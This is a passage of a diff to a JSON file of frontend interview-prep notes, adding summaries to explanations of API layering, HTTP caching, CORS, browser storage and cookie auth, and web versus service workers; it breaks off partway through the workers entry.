       "answer": "## What is AJAX?\n\n**AJAX** stands for **Asynchronous JavaScript and XML**. It's a set of technologies that enable sending/receiving data from a server **without reloading the page**.\n\n## Technologies involved\n\n| Technology | Role |\n|------------|------|\n| **HTML** | Web page structure |\n| **CSS** | Styling |\n| **JavaScript** | Behavior, DOM updates |\n| **XMLHttpRequest API** | Send and retrieve data |\n| **Server-side language** | PHP, Python, Node.js, etc. |\n\n## Modern AJAX\n\nToday, `XMLHttpRequest` is largely replaced by the `fetch` API:\n\n```javascript\n// Old way\nconst xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"/api/data\");\nxhr.onload = () => {\n  if (xhr.status === 200) {\n    console.log(JSON.parse(xhr.responseText));\n  }\n};\nxhr.send();\n\n// Modern way\nfetch(\"/api/data\")\n  .then((res) => res.json())\n  .then((data) => console.log(data));\n```"
     },
     {
@@ -120,6 +372,36 @@
         "async"
       ],
       "source": "user request: 1-day interview prep - browser & architecture",
+      "summary": {
+        "definition": "Frontend API architecture is the set of decisions about how your UI talks to the server: what shape the calls take, who owns errors and retries, and where the line between client and server actually sits.",
+        "api": [
+          {
+            "signature": "fetch(`${BASE_URL}${path}`, { headers })",
+            "note": "one wrapper every call goes through, so the base URL, headers and auth live in one place"
+          },
+          {
+            "signature": "if (!res.ok) throw new ApiError(res.status)",
+            "note": "normalise status codes into one error type, or every component handles 401/404/500 itself"
+          },
+          {
+            "signature": "Promise.all([a, b, c])",
+            "note": "fire independent calls together instead of waterfalling them one after another"
+          },
+          {
+            "signature": "Promise.allSettled([a, b, c])",
+            "note": "when one failure should not blank out the whole screen"
+          },
+          {
+            "signature": "new AbortController() → { signal }",
+            "note": "cancel a stale request, so a slow first response cannot overwrite a fast second one"
+          },
+          {
+            "signature": "new URLSearchParams(params)",
+            "note": "build the query string instead of hand-escaping it"
+          }
+        ],
+        "useCase": "A dashboard loading the user, their projects and their notifications at once, where a failed notifications call still leaves the rest of the page usable."
+      },
       "answer": "**Frontend API architecture** is the set of decisions about how your UI talks to the server: what shape the calls take, who owns error handling and retries, and where the boundary between client and server actually sits.\n\nTo put it simply: the question isn't \"how do I call `fetch`\" — it's \"what layer owns the network, so that components don't have to.\"\n\n## The Problem\n\n`fetch` inside a component is fine exactly once. At scale it produces the same five problems in every codebase:\n\n- The base URL and auth header are copy-pasted everywhere\n- Error handling is inconsistent — some places catch, some don't\n- Two components mounting together fire the same request twice\n- Nothing is retried, or everything is retried including the things that shouldn't be\n- Every component reimplements loading and error state\n\nThe fix is a **layer**, not a library. Even a thin one.\n\n## The layers\n\n```\nComponent        →  renders; knows nothing about HTTP\n   ↓\nHook / query     →  caching, loading & error state, refetch\n   ↓\nAPI module       →  typed functions: getUsers(), createOrder()\n   ↓\nHTTP client      →  base URL, auth header, interceptors, retries\n   ↓\nServer / BFF\n```\n\nThe rule that makes this work: **a component should never know a URL exists.** It calls `useUsers()`. If the endpoint moves, one file changes.\n\n```javascript\n// http.js — one place for cross-cutting concerns\nasync function request(path, options = {}) {\n  const res = await fetch(`${BASE_URL}${path}`, {\n    ...options,\n    headers: {\n      \"Content-Type\": \"application/json\",\n      ...authHeader(),\n      ...options.headers,\n    },\n  });\n\n  if (!res.ok) {\n    // Normalize failures into one error shape the whole app understands\n    throw new ApiError(res.status, await res.json().catch(() => null));\n  }\n\n  return res.status === 204 ? null : res.json();\n}\n\n// api/users.js — the vocabulary of your domain, not of HTTP\nexport const getUsers = (params) =>\n  request(`/users?${new URLSearchParams(params)}`);\nexport const createUser = (body) =>\n  request(\"/users\", { method: \"POST\", body: JSON.stringify(body) });\n```\n\n**The `!res.ok` check is the detail interviewers look for.** `fetch` only rejects on *network* failure — a `404` or `500` resolves normally with `ok: false`. Code that only uses `.catch()` silently treats server errors as success. That's a real bug that ships often.\n\n## REST vs GraphQL vs BFF\n\n**REST** — resources and verbs. Simple, cacheable by HTTP out of the box, universally understood. Its weakness is shape: you get **over-fetching** (the endpoint returns 40 fields, you render 3) and **under-fetching** (you need three round trips to build one screen — the classic waterfall).\n\n**GraphQL** — the client declares exactly what it needs, in one request. Solves both fetching problems and is excellent when many different clients need different shapes of the same data. Costs: [HTTP caching](/browser/157) no longer works out of the box (everything is a POST to one URL), you need query-complexity limits to prevent abuse, and the tooling is heavier. It also makes the N+1 problem the server's headache.\n\n**BFF (Backend For Frontend)** — a thin server layer you own, sitting between your UI and the real services, shaping responses for exactly this frontend. The pragmatic middle ground: it kills over-fetching without adopting GraphQL, lets you keep secrets server-side, and gives you a same-origin API so CORS and cookie handling get simpler ([CORS](/browser/156)).\n\n**How to answer \"which would you pick?\"** — Don't pick abstractly. *\"Depends on how many clients consume this and how variable the data needs are. One web client against a stable API: REST, with a BFF if I'm fighting over-fetching. Several clients each needing different slices: GraphQL earns its complexity.\"*\n\n## Errors, retries, and the details that matter\n\n**Retry only what's safe.** `GET` is idempotent — retrying is harmless. Blindly retrying a `POST` can create two orders. Retry `GET`s and explicitly idempotent mutations; for the rest, use an idempotency key.\n\n**Retry only what might succeed.** A `500` or a network blip, yes. A `400` or `422` will fail identically forever — retrying is pure latency.\n\n**Back off exponentially**, with jitter. Fixed-interval retries from thousands of clients produce a thundering herd that keeps a recovering server down. You already have this at [fetchWithAutoRetry — Auto-retry Promise on rejection](/coding/25).\n\n**Cancel what you don't need.** `AbortController` on unmount and on superseded requests:\n\n```javascript\nuseEffect(() => {\n  const controller = new AbortController();\n\n  getUsers({ signal: controller.signal })\n    .then(setUsers)\n    .catch((err) => {\n      if (err.name !== \"AbortError\") setError(err);\n    });\n\n  return () => controller.abort();\n}, [query]);\n```\n\n**The race condition this prevents is the thing to name out loud.** Type \"a\", then \"ab\". Two requests in flight. If \"a\" resolves *second*, you render results for a query the user has moved past. Aborting — or the `cancelled` flag pattern — is what keeps the UI honest ([Data Fetching and Race Conditions](/advanced-react/15)).\n\n## Why you probably shouldn't hand-roll all of this\n\nReact Query / SWR / RTK Query give you caching, deduplication of in-flight requests, background refetch, retry with backoff, and cancellation — the things above, already correct.\n\n**The framing that reads as senior:** server data is not really *state* you own. It's a **cache of something that lives elsewhere and changes without telling you.** Once you see it that way, putting it in Redux alongside your UI state feels wrong, and a purpose-built server-cache library feels obviously right ([Server State vs. Client State](/react-guide/27), [State Management: The Decision Ladder](/react-learnings/26)).\n\n## Follow-ups\n\n**\"How do you handle a slow endpoint?\"** — Diagnose first: slow server, large payload, or a waterfall? Fixes differ — pagination, field selection, parallelizing with `Promise.all`, prefetching on hover, or optimistic UI so the user isn't waiting at all.\n\n**\"Where does validation live?\"** — Both ends. Client-side for fast feedback; server-side because the client can be bypassed entirely. Say both, always.\n\n**\"How do you handle partial failure on a dashboard?\"** — `Promise.allSettled`, not `Promise.all`. One dead widget shouldn't blank the page. This is a great chance to show you know why `all`'s fail-fast is sometimes wrong.\n\n**\"Polling, SSE, or WebSockets?\"** — Polling for infrequent updates, simplest and cache-friendly. **SSE** for one-way server push (notifications, live feeds) — plain HTTP, auto-reconnects. **WebSockets** when you need genuinely bidirectional, low-latency traffic (chat, collaborative editing), at the cost of connection state and scaling complexity."
     },
     {
@@ -132,6 +414,36 @@
         "caching"
       ],
       "source": "user request: 1-day interview prep - browser & architecture",
+      "summary": {
+        "definition": "HTTP caching is how the browser avoids downloading something it already has. The server attaches rules to each response saying how long the copy may be reused, and how to check cheaply whether it is still current.",
+        "api": [
+          {
+            "signature": "Cache-Control: max-age=N",
+            "note": "reuse it without asking the server for N seconds"
+          },
+          {
+            "signature": "Cache-Control: no-cache",
+            "note": "you may store it, but revalidate before every use — not the same as `no-store`"
+          },
+          {
+            "signature": "Cache-Control: no-store",
+            "note": "never write it to disk at all"
+          },
+          {
+            "signature": "ETag → If-None-Match → 304",
+            "note": "a fingerprint; if it matches, the server replies 304 and does not re-send the body"
+          },
+          {
+            "signature": "Cache-Control: max-age=31536000, immutable",
+            "note": "for hashed filenames like `app.a3f9c2.js` — the content can never change, so never revalidate"
+          },
+          {
+            "signature": "Cache-Control: stale-while-revalidate=N",
+            "note": "serve the stale copy instantly and refresh it in the background"
+          }
+        ],
+        "useCase": "Shipping a fix and users still seeing the old app: the hashed JS is cached forever on purpose, but `index.html` was cached too, so the browser never asks for the new filenames."
+      },
       "answer": "**HTTP caching** is how the browser avoids re-downloading things it already has. It's the cheapest performance win available, and the most common source of \"why is the user still seeing the old version?\"\n\nTo put it simply: the server attaches instructions to each response saying how long the browser may reuse it, and how to check cheaply whether it's still good.\n\n## The Problem\n\nEvery asset re-downloaded is bandwidth, latency, and battery you didn't need to spend. But cache too aggressively and you ship a bug fix that nobody receives for a week. The whole subject is managing that tension.\n\n## Two questions, two mechanisms\n\nCaching answers two separate questions, and confusing them is where most bugs come from:\n\n**1. \"Can I skip the request entirely?\"** → **freshness**, via `Cache-Control`.\n**2. \"It might be stale — has it actually changed?\"** → **validation**, via `ETag` / `Last-Modified`.\n\nThe first avoids the network completely. The second still costs a round trip, but avoids re-downloading the body.\n\n## `Cache-Control` — the directives that matter\n\n```\nCache-Control: max-age=31536000, immutable\n```\n\n| Directive | Means |\n| --- | --- |\n| `max-age=N` | Fresh for N seconds. **Don't even ask.** |\n| `no-cache` | Cache it, but **revalidate every time** before use. Misleadingly named. |\n| `no-store` | Never write it down at all. For sensitive data. |\n| `private` | Browser may cache; shared caches and CDNs may not. |\n| `public` | Any cache may store it, even with an `Authorization` header. |\n| `immutable` | It will never change — skip revalidation even on reload. |\n| `stale-while-revalidate=N` | Serve the stale copy instantly, refresh in the background. |\n\n**`no-cache` does not mean \"don't cache.\"** It means \"cache, but always check first.\" `no-store` is the one that means don't cache. This distinction is a very common interview question precisely because the naming is bad.\n\n## Validation — `ETag` and `304`\n\nWhen something is stale but probably unchanged, the browser asks cheaply:\n\n```\nResponse:  ETag: \"abc123\"\nLater →    If-None-Match: \"abc123\"\nServer  →  304 Not Modified          ← no body, just headers\n```\n\nA `304` is a few hundred bytes instead of a few hundred kilobytes. `Last-Modified` / `If-Modified-Since` works the same way with a timestamp, but it's only second-granular and breaks when a rebuild changes mtimes without changing content. **`ETag` is the better mechanism.**\n\n## The strategy that solves the tension\n\nThis is the answer to *\"how do you cache aggressively without shipping stale code?\"* — and it's what every modern [bundler](/web-fundamentals/9) does:\n\n**Content-hash your assets and cache them forever.**\n\n```\n/assets/app.a3f9c2.js     Cache-Control: max-age=31536000, immutable\n/assets/main.7b21e4.css   Cache-Control: max-age=31536000, immutable\n```\n\n**Never cache the HTML.**\n\n```\n/index.html               Cache-Control: no-cache\n```\n\nThe logic is elegant: the filename contains a hash of the contents, so **a changed file is a different URL**. There's no such thing as a stale `app.a3f9c2.js` — if the code changed, the name changed. Meanwhile `index.html` is revalidated on every visit, and it's the file that points at the new hashed names. One small conditional request unlocks the entire new build.\n\nThat's why Vite and webpack put hashes in output filenames by default. Being able to explain *why* is a strong answer.\n\n## `stale-while-revalidate`\n\n```\nCache-Control: max-age=60, stale-while-revalidate=3600\n```\n\nFresh for 60 seconds. For the next hour, serve the **stale copy immediately** while fetching a fresh one in the background. The user never waits; the next visit gets the update.\n\nThe same idea drives React Query and SWR (the library is literally named after this header) at the application layer: show cached data instantly, refetch quietly, update when it lands.\n\n## The layers of cache\n\nA request can be answered at any of these, nearest first:\n\n1. **Memory cache** — this tab, this session. Instant.\n2. **Disk cache** — the browser's persistent HTTP cache.\n3. **Service worker** — programmable; you control it in JS. Enables offline.\n4. **[CDN](/system-design/115) / edge** — shared across all users, near them geographically.\n5. **Origin server** — and possibly its own Redis or application cache.\n\nUse `private` to keep per-user responses out of layers 4 and 5. Getting that wrong means one user's data served to another — the worst caching bug there is, and worth naming as a risk.\n\n## In application code\n\nBeyond HTTP, the caching you actually write:\n\n- **React Query / SWR** — the server-state cache: `staleTime`, `cacheTime`, background refetch, dedup of identical in-flight requests\n- **`useMemo`** — caching a computed value across renders ([useMemo & useCallback: What They Actually Buy You](/react-guide/9))\n- **Memoized functions** — caching by argument ([Memoization Helper](/coding/27))\n- **`localStorage`** — persisting across sessions, but synchronous and easy to let go stale\n\n## Trade-offs and follow-ups\n\n**\"How do you invalidate?\"** — The honest answer is that you mostly don't. You make invalidation unnecessary by changing the URL (content hashing). Where you genuinely must invalidate, CDNs offer purge APIs, and cache tags let you purge a group.\n\n**\"What's the risk of caching too aggressively?\"** — Users stuck on a broken build with no way to recover except a hard refresh. This is precisely why `index.html` is `no-cache` — it's the escape hatch that lets every other file be cached forever.\n\n**\"Should API responses be cached?\"** — Depends on volatility and whether they're per-user. A public product list, absolutely — `max-age` plus `stale-while-revalidate`. A user's account page, `private, no-cache` at most. Anything with tokens or PII, `no-store`.\n\n**\"Service worker or HTTP cache?\"** — HTTP caching first; it's declarative and hard to get catastrophically wrong. [Service workers](/web-fundamentals/15) give you offline support and fine-grained control, at the cost of a genuinely tricky update lifecycle — a bad service worker can pin users to an old build semi-permanently."
     },
     {
@@ -143,6 +455,36 @@
         "HTTP"
       ],
       "source": "user request: 1-day interview prep - browser & architecture",
+      "summary": {
+        "definition": "CORS is the browser asking permission on your behalf. When your page calls a different origin the request still goes out, but the browser hides the response unless that server's headers say your origin is allowed to read it. The server grants access, not your client code.",
+        "api": [
+          {
+            "signature": "Access-Control-Allow-Origin: https://app.example.com",
+            "note": "the header that grants it — `*` or one exact origin, never a list"
+          },
+          {
+            "signature": "Origin",
+            "note": "the header the browser attaches; you cannot set or fake it from JavaScript"
+          },
+          {
+            "signature": "OPTIONS preflight",
+            "note": "sent first for anything non-simple — a `PUT`, or `Content-Type: application/json`"
+          },
+          {
+            "signature": "Access-Control-Allow-Methods / -Headers",
+            "note": "what the preflight has to approve before the real request is allowed out"
+          },
+          {
+            "signature": "fetch(url, { credentials: 'include' })",
+            "note": "sends cookies — and then `Allow-Origin: *` stops working; it must be the exact origin plus `Allow-Credentials: true`"
+          },
+          {
+            "signature": "fetch(url, { mode: 'no-cors' })",
+            "note": "not a fix: the request goes out but the response comes back opaque and unreadable"
+          }
+        ],
+        "useCase": "A React app on `localhost:3000` calling an API on `localhost:8000` and getting a console error — the request reached the server fine, the browser just refused to hand you the answer."
+      },
       "answer": "**CORS** — Cross-Origin Resource Sharing — is the mechanism by which a server tells the browser *\"it's fine for this other origin to read my response.\"*\n\nTo put it simply: CORS is not a wall that stops your request. It's a permission slip the server hands back, and the **browser** is the one enforcing it.\n\n## The Problem it solves\n\nWithout restrictions, any page you visit could fire a `fetch` at `your-bank.com`, ride along on your logged-in cookies, and read your balance. The **same-origin policy** exists to prevent that: by default, JavaScript on one origin cannot *read* responses from another.\n\nAn **origin** is the triple `scheme + host + port`. All of these are cross-origin relative to `https://app.example.com`:\n\n| URL | Why |\n| --- | --- |\n| `http://app.example.com` | different scheme |\n| `https://api.example.com` | different host (a subdomain is a different host) |\n| `https://app.example.com:8080` | different port |\n\nBut total lockdown is too strict — real apps legitimately call their own API on another domain. CORS is the controlled exception.\n\n## What actually happens\n\nHere's the part that clears up most confusion: **the request usually goes through and the server usually processes it.** The browser then refuses to hand you the response because the right header wasn't on it.\n\nSo a CORS error does not mean \"blocked before sending.\" For a simple request, your backend already ran the code. This is why *a CORS failure can still have created a record in the database* — a genuinely surprising fact and a great thing to know.\n\nThe browser sends an `Origin` header. The server must reply with:\n\n```\nAccess-Control-Allow-Origin: https://app.example.com\n```\n\nIf that header is absent or doesn't match, the browser discards the response and throws. Your `fetch` rejects; you cannot inspect the status or the body.\n\n## Preflight — the `OPTIONS` request\n\nSome requests are considered **\"simple\"** and go straight out. A request is simple only if:\n\n- Method is `GET`, `HEAD`, or `POST`, **and**\n- The only headers set are a safe-listed few, **and**\n- `Content-Type` is one of `text/plain`, `multipart/form-data`, or `application/x-www-form-urlencoded`\n\nAnything else — `PUT`, `DELETE`, a custom `Authorization` header, or (very commonly) **`Content-Type: application/json`** — triggers a **preflight**: the browser first sends an `OPTIONS` request asking permission.\n\n```\nOPTIONS /api/users\nOrigin: https://app.example.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: content-type, authorization\n```\n\nThe server must answer:\n\n```\nAccess-Control-Allow-Origin: https://app.example.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400\n```\n\nOnly then does the real request go. **`Access-Control-Max-Age` caches that permission** so you're not paying an extra round trip on every call — a genuine performance detail worth raising.\n\nNote the asymmetry: a preflighted request that fails **never reaches your handler**. A simple request that fails **does**.\n\n## Credentials — the trap everyone hits\n\nTo send cookies cross-origin you need both sides to opt in:\n\n```javascript\nfetch(url, { credentials: \"include\" });\n```\n\nAnd the server must send:\n\n```\nAccess-Control-Allow-Origin: https://app.example.com   ← exact origin, NOT *\nAccess-Control-Allow-Credentials: true\n```\n\n**`Access-Control-Allow-Origin: *` is rejected when credentials are involved.** The wildcard works fine until someone adds cookies, and then it breaks with an error message that doesn't obviously point at the wildcard. This is the single most common real-world CORS bug — knowing it in advance is worth a lot.\n\n## The four failures you'll actually see\n\n1. **\"No `Access-Control-Allow-Origin` header is present\"** — the server isn't configured for CORS at all, or not for your origin.\n2. **\"The value of `Access-Control-Allow-Origin` must not be the wildcard when credentials mode is `include`\"** — the wildcard-plus-cookies trap above.\n3. **\"Method PUT is not allowed by `Access-Control-Allow-Methods`\"** — preflight rejected; the server didn't list your method.\n4. **\"Request header field `authorization` is not allowed\"** — the server didn't list your custom header in `Access-Control-Allow-Headers`.\n\n## How you fix it — in priority order\n\n**Configure the server.** This is the real fix. CORS is a *server* setting; there is no correct client-side workaround.\n\n**Use a dev proxy.** In Vite, `server.proxy` makes the request same-origin from the browser's point of view, so CORS never applies. Development only.\n\n**Same-origin in production via a reverse proxy or [BFF](/system-design/102)** — serve the API under `/api` on the same origin. Then CORS is irrelevant *and* you can use `httpOnly` cookies without cross-site complications.\n\n**What is never the fix:** a browser extension that disables CORS, or `mode: 'no-cors'`. `no-cors` returns an **opaque** response — status 0, no readable body. It silences the error by making the response useless. Saying this explicitly is a good signal; a lot of people think `no-cors` is a solution.\n\n## Follow-ups\n\n**\"Why doesn't Postman get CORS errors?\"** — Because CORS is enforced by *browsers*, not servers. Postman isn't a browser and has no origin to protect. This question is a direct test of whether you understand where enforcement lives.\n\n**\"Why do `<img>` and `<script>` tags work cross-origin?\"** — Because the same-origin policy restricts *reading*, not *loading*. You can display a cross-origin image, but you can't read its pixels out of a canvas without CORS — doing so \"taints\" the canvas.\n\n**\"Is CORS a security feature?\"** — It's a *relaxation* of one. The same-origin policy is the security feature; CORS is the controlled way to poke holes in it. It protects users from malicious sites, not servers from malicious clients — anyone can still call your API directly with curl. Server-side authorization is what protects the API."
     },
     {
@@ -153,6 +495,36 @@
         "storage"
       ],
       "source": "user paste: senior frontend JS concepts; user paste: AI Mode conversation on cookie scope and cookie auth",
+      "summary": {
+        "definition": "All three store data in the browser, and they differ in who can read it and when it disappears. Cookies are sent to the server on every request and can be hidden from JavaScript; `localStorage` and `sessionStorage` stay in the browser and any script on the page can read them.",
+        "api": [
+          {
+            "signature": "localStorage.setItem(key, value) / .getItem(key)",
+            "note": "strings only, survives a browser restart, scoped to the origin"
+          },
+          {
+            "signature": "sessionStorage",
+            "note": "identical API, wiped when the tab closes — and a second tab gets its own copy"
+          },
+          {
+            "signature": "document.cookie",
+            "note": "read and write cookies from JavaScript — but never the `HttpOnly` ones"
+          },
+          {
+            "signature": "Set-Cookie: token=…; HttpOnly",
+            "note": "server-only cookie; script cannot read it, which is the entire point for a session"
+          },
+          {
+            "signature": "; Secure; SameSite=Lax",
+            "note": "HTTPS only, and not attached to cross-site requests — the CSRF defence"
+          },
+          {
+            "signature": "; Domain=example.com; Path=/",
+            "note": "cookies are scoped by host *and* path, unlike storage, which is scoped to the whole origin"
+          }
+        ],
+        "useCase": "Keeping the login session in an `HttpOnly` cookie so an XSS bug cannot steal it, and the user's chosen theme in `localStorage`, where surviving a restart is exactly what you want."
+      },
       "answer": "Three places the browser will hold data for you, and the first question about all of them is the same: **who can read this?** The answer is not the same for the three, and that is the part most people get wrong.\n\n## Scope — cookies are not scoped like the Storage APIs\n\n`localStorage` and `sessionStorage` are bound by the **same-origin policy**. An *origin* is three things joined together:\n\n```\nscheme  +  host  +  port\nhttps://   shop.example.com   :443\n```\n\nChange any one of them and it is a different origin, with a different, empty store. `https://shop.example.com` and `http://shop.example.com` do not share a `localStorage`. Neither do `shop.example.com` and `login.example.com`.\n\nA **cookie ignores all three axes** and uses two of its own:\n\n- **`Domain`** — set `Domain=example.com` and the cookie is sent for `example.com`, `shop.example.com` and `login.example.com` alike. This is how a login on one subdomain is recognised on another, and there is no `localStorage` equivalent.\n- **`Path`** — set `Path=/admin` and the browser attaches the cookie only to requests whose URL starts with `/admin`. `localStorage` has no path axis at all: every page on the host reads the same store.\n\n![Scope — localStorage is origin-locked, a cookie is not](/diagrams/browser/storage-scope.svg)\n\nTwo consequences worth remembering:\n\n- Cookies are **not** protected by the scheme. `Secure` is what stops a cookie travelling over plain `http://` — the browser will not infer it.\n- Cookies ignore the **port**, so `localhost:3000` and `localhost:8080` share a cookie jar while having completely separate `localStorage`. That surprises people running two dev servers.\n\n## The comparison\n\n| Feature | Cookie | localStorage | sessionStorage |\n| --- | --- | --- | --- |\n| Capacity | ~4KB (very small) | ~5MB–10MB | ~5MB |\n| Expiration | You set it (`Expires` / `Max-Age`) | Never, until deleted | When the tab closes |\n| Scope | Domain + Path | One origin | One origin, one tab |\n| Server access | Sent with every matching request | Client-side only | Client-side only |\n| JavaScript access | No, if `HttpOnly` | Yes, any script on the page | Yes, any script on the page |\n| XSS exposure | None with `HttpOnly` | Total — a script reads every key | Total — a script reads every key |\n| CSRF exposure | Yes — needs `SameSite` | None, it is never sent automatically | None |\n| Transmission | Automatic | Manual, via `fetch` headers | Manual |\n\nRead the last three rows together: they are the whole trade. A cookie moves the risk from *theft by a script* to *forgery by another site*, and only the second one is closed by a single attribute.\n\n## What each is actually used for\n\n**Cookies** — anything the **server** must see on every request:\n\n- Session ids and auth tokens.\n- Server-rendered preferences: locale, currency, region, so the first HTML is already correct.\n- A/B test buckets and analytics ids, so the server serves a consistent variant.\n\n**`localStorage`** — non-sensitive frontend state that should survive a browser restart:\n\n- UI preferences: dark mode, sidebar width, the last tab you had open.\n- Draft autosave, so a refresh does not eat a half-written comment.\n- Caching rarely-changing reference data (a country list) to skip a request.\n- A guest shopping cart, before the user has an account.\n\n**`sessionStorage`** — non-sensitive state tied to **one tab**, wiped when it closes:\n\n- Multi-step wizards and checkout flows, where two tabs must not bleed into each other.\n- The current filter, sort and scroll position, so **Back** returns you to the same place.\n- A \"already shown this session\" flag for a welcome modal.\n\nThe tab isolation is a feature *and* a trap: if you keep a login token in `sessionStorage`, a user who middle-clicks a link into a new tab arrives logged out.\n\n## Using cookies for auth\n\nThe server issues the token; the browser carries it. There is no step where your JavaScript touches it.\n\n1. **Login** — the client `POST`s the credentials once.\n2. **Verify** — the server checks the password and mints a session id or a signed JWT.\n3. **`Set-Cookie`** — the server puts the token in a response header with its security attributes.\n4. **Store** — the browser saves it in the cookie jar automatically.\n5. **Every later request** — the browser attaches `Cookie: auth_token=…` to any request matching the `Domain` and `Path`. The server reads it and knows who you are.\n\n![Cookie auth — the round trip, the attributes, the two attacks](/diagrams/browser/cookie-auth.svg)\n\nThe header the server sends:\n\n```text\nSet-Cookie: auth_token=<token>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=604800\n```\n\n| Attribute | What it does |\n| --- | --- |\n| `HttpOnly` | JavaScript cannot read the cookie — `document.cookie` will not show it. An XSS payload gets nothing. |\n| `Secure` | Sent over HTTPS only, so there is nothing to intercept in plaintext. |\n| `SameSite=Lax` | Withheld on cross-site `POST`s and iframes, sent on a normal top-level navigation. This is the CSRF fix. `Strict` also withholds it when the user arrives from an external link — safer, but they land logged out. |\n| `Path=/` | The whole app can use it. Narrow it (`Path=/admin`) when only part of the app needs it. |\n| `Max-Age` | Seconds until the browser drops it. Omit it and you get a *session cookie*, erased when the browser closes. |\n\n### Can JavaScript set a cookie?\n\nOrdinary ones, yes:\n\n```javascript\ndocument.cookie = \"theme=dark; max-age=31536000; path=/; secure; samesite=lax\";\n```\n\n`HttpOnly` ones, **no** — by design. Only the server can set an `HttpOnly` cookie, via `Set-Cookie`, and once set it is invisible to `document.cookie`; a script cannot read it, overwrite it or delete it. That restriction is not an inconvenience, it *is* the protection.\n\nSo: preferences and analytics ids from `document.cookie` if you like; tokens only from the server.\n\n## The verdict\n\nPut the session in an **`HttpOnly` + `Secure` + `SameSite`** cookie. It closes XSS token theft, which you cannot fully prevent, in exchange for CSRF, which you close with one attribute.\n\nReach for `localStorage` only when a cookie is genuinely impossible — a frontend and an API on unrelated domains — and know that you are then betting the session on never shipping an XSS, including from a dependency. An in-memory access token (a plain variable, gone on reload) with a refresh cookie behind it is the better version of that bet.\n\n## Related\n\n- [Auth & Security: JWT, XSS, CSRF](/browser/158) — how those two attacks work, and what else defends against them\n- [CORS](/browser/156) — why a cross-origin `fetch` needs `credentials: 'include'` before it will send the cookie at all\n- [HTTP Caching](/browser/157) — the other headers the server sets on the way back"
     },
     {
@@ -165,6 +537,36 @@
         "concurrency"
       ],
       "source": "user paste: service workers, app shell, and worker types",
+      "summary": {
+        "definition": "A web worker is a background thread that runs your JavaScript without freezing the page. A service worker is a background script sitting between your page and the network, so it can answer requests from a cache — including when you are offline.",
+        "api": [
+          {
+            "signature": "new Worker(url, { type: 'module' })",
+            "note": "starts a web worker; one page owns it, and it dies with that page"
+          },
+          {
+            "signature": "worker.postMessage(data) / worker.onmessage",
+            "note": "the only way in and out — the data is copied, not shared"
+          },
+          {
+            "signature": "worker.terminate()",
+            "note": "kills it from the page; `self.close()` does it from inside"
+          },
+          {
+            "signature": "navigator.serviceWorker.register(url, { scope })",
+            "note": "installs a service worker; it outlives every tab and survives a restart"
+          },
+          {
+            "signature": "self.addEventListener('fetch', e => e.respondWith(…))",
+            "note": "the service worker's whole point — intercept a request and answer it yourself"
+          },
+          {
+            "signature": "caches.open(name) → cache.match / cache.put",
+            "note": "the storage a service worker serves those answers from"
+          }
+        ],
+        "useCase": "A web worker parses a 50,000-row CSV export while the user keeps scrolling the table. A service worker makes that same app open on a train with no signal."
+      },
       "answer": "Both run JavaScript off the main thread with no DOM access, which is why the question \"is a service worker just a web worker?\" comes up constantly. They share an ancestry and almost nothing else: one exists because **computation** blocks the UI, the other because the **network** is unreliable.\n\n## The shape of it\n\n![Web worker vs service worker](/diagrams/browser/worker-types.svg)\n\n## Web workers — the compute worker\n\nA dedicated worker is a second thread you own, spawned by one page and belonging to it alone.\n\n```javascript\n// main thread\nconst worker = new Worker(\"worker.js\", { type: \"module\" });\nworker.postMessage({ task: \"parse\", rows: hugeCsv });\nworker.onmessage = (e) => render(e.data);\n\n// worker.js\nself.onmessage = (e) => {\n  const result = heavyComputation(e.data.rows); // 400ms, and nobody notices\n  self.postMessage(result);\n};\n```\n\n**What you get:** the main thread stays free, so scrolling and input keep hitting their frame budget while the work happens. That is the entire point — a 400ms parse on the main thread is 24 dropped frames and a visibly stuck page.\n\n**What you give up:**\n\n- **No DOM, no `window`, no `document`.** A worker cannot touch the page; it returns data and the main thread renders it.\n- **Structured clone on every message.** Functions, DOM nodes and class identity do not survive the boundary — only data does. Large payloads are *copied*, which is why a chatty worker can cost more than it saves. Batch across the boundary, and use `Transferable`s (`ArrayBuffer`, `OffscreenCanvas`) to hand over ownership instead of copying.\n- **It cannot see the network.** A worker can `fetch`, but it cannot intercept anyone else's request.\n\n### When it is worth it\n\n- Parsing at volume — JSON or CSV at thousands of rows a second, as in a [log viewer](/system-design/314).\n- Image and video processing, compression, crypto, diffing.\n- Large client-side aggregation or search index building.\n\n### When it is not\n\nIf the jank is **layout or paint**, a worker moves nothing — the rendering still happens on the main thread. Measure which half you are in first; \"put it in a worker\" is the most common wrong answer to a paint problem.\n\n## Service workers — the network worker\n\nA [service worker](/web-fundamentals/15) is a programmable proxy sitting between every page on the origin and the network.\n\n```javascript\n// sw.js — nothing here is possible in a web worker\nself.addEventListener(\"fetch\", (event) => {\n  if (event.request.method !== \"GET\") return;\n  event.respondWith(\n    caches.match(event.request).then((hit) => hit ?? fetch(event.request)),\n  );\n});\n```\n\n`event.respondWith()` is the line that has no equivalent anywhere else in the platform: the page asked for a URL, and the worker answered it — possibly from cache, possibly offline, possibly with something entirely synthesised.\n\n## The differences that actually matter\n\n| | Web worker | Service worker |\n| --- | --- | --- |\n| **Why it exists** | the main thread is busy | the network is unreliable |\n| **Relationship** | 1 : 1 with the page that spawned it | 1 : many — one worker controls every tab in scope |\n| **Lifetime** | dies when its tab closes | independent of tabs; the browser starts and stops it |\n| **Network** | can `fetch`; cannot intercept | intercepts every request in scope |\n| **Woken by** | `postMessage` | `install`, `activate`, `fetch`, `push`, `sync` |\n| **Scope** | the script that made it | a URL path — `/sw.js` controls all of `/` |\n| **Persists** | no | yes, across restarts, until unregistered |\n| **HTTPS** | not required | required (localhost excepted) |\n\nThree of these are load-bearing:\n\n**One-to-many is the big one.** Ten tabs of your app means ten web workers if each page spawns one — and exactly *one* service worker for all of them. That is also why a service worker is the right place to coordinate across tabs, and why a bad one breaks every tab at once.\n\n**It is stopped and restarted at will.** The browser kills an idle service worker and wakes it on the next event, so **module-level state does not survive**. A variable set during `fetch` is routinely gone by the next request. Persist to [Cache Storage or IndexedDB](/web-fundamentals/16), never to a global.\n\n**It outlives the page.** Push notifications and [background sync](/system-design/106) arrive with no tab open at all — impossible for a web worker, which died with its tab.\n\n## The trace\n\nSame origin, two very different lifetimes:\n\n```trace\n{\n  \"input\": \"user opens two tabs, runs a parse, then closes both\",\n  \"lanes\": [\n    { 